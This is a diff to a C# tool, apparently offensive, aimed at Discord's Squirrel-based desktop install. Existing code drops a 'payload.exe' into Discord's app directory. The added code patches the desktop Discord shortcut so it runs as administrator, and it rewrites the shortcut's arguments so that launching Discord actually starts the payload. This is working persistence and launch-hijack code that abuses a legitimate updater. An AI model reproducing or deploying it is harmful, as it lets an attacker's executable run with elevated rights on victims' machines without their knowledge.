@@ -1,4 +1,5 @@
-﻿using System;
+﻿using IWshRuntimeLibrary;
+using System;
 using System.IO;
 using System.Text.RegularExpressions;
 
@@ -7,6 +8,7 @@ namespace SquirrelFramework
     internal class Program
     {
         public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         public static readonly string AppName = "Discord";
 
         static void Main(string[] args)
@@ -21,12 +23,12 @@ namespace SquirrelFramework
 
             string releasesFilePath = Path.Combine(appRoot, "packages", "RELEASES");
 
-            if (!File.Exists(releasesFilePath))
+            if (!System.IO.File.Exists(releasesFilePath))
             {
                 Console.WriteLine("Releases file not found.");
                 return;
             }
-           
+
             string version = ExtractVersion(releasesFilePath);
 
             if (string.IsNullOrEmpty(version))
@@ -41,6 +43,35 @@ namespace SquirrelFramework
                 return;
             }
 
+            if (EditShortCut())
+            {
+                Console.WriteLine("edited shortcut with success.");
+            }
+            else
+            {
+                Console.WriteLine("failed to edit the shortcut.");
+            }
+        }
+
+        static bool EditShortCut()
+        {
+            string shortcutPath = Path.Combine(DesktopPath, $"{AppName}.lnk");
+            if (!System.IO.File.Exists(shortcutPath))
+            {
+                return false;
+            }
+
+            // set shortcut to run as admin
+            byte[] data = System.IO.File.ReadAllBytes(shortcutPath);
+            data[21] = 34;
+            System.IO.File.WriteAllBytes(shortcutPath, data);
+
+            // change shortcut arguments
+            var shortcut = new IWshShell_Class().CreateShortcut(shortcutPath) as IWshShortcut;
+            shortcut.Arguments = $"--processStart \"payload.exe\" --process-start-args \"{AppName}.exe\"";
+            shortcut.Save();
+
+            return true;
         }
 
         static bool CopyPayloadToDirectory(string discordPath, string version)
@@ -50,7 +81,7 @@ namespace SquirrelFramework
 
             if (Directory.Exists(appDirectory))
             {
-                File.Copy(payloadPath, Path.Combine(appDirectory, "payload.exe"), true);
+                System.IO.File.Copy(payloadPath, Path.Combine(appDirectory, "payload.exe"), true);
                 return true;
             }
 
@@ -59,7 +90,7 @@ namespace SquirrelFramework
 
         static string ExtractVersion(string filepath)
         {
-            string content = File.ReadAllText(filepath);
+            string content = System.IO.File.ReadAllText(filepath);
 
             string pattern = @"\d+(\.\d+)+";
             Match match = Regex.Match(content, pattern);
